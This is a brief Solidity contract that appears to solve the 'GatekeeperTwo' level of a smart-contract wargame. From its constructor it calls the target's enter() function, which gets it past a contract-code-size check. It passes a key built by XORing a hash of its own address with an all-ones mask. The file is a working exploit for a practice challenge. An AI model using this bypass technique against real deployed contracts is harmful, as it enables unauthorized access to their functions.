// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.6.0;

import "./14_GatekeeperTwo.sol";

contract GatekeeperTwoAttack {
    constructor(address _target) public {
        GatekeeperTwo target = GatekeeperTwo(_target);
        uint64 mask = uint64(0) - 1;
        uint64 preKey = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 key = preKey ^ mask;
        target.enter(bytes8(key));
    }
}
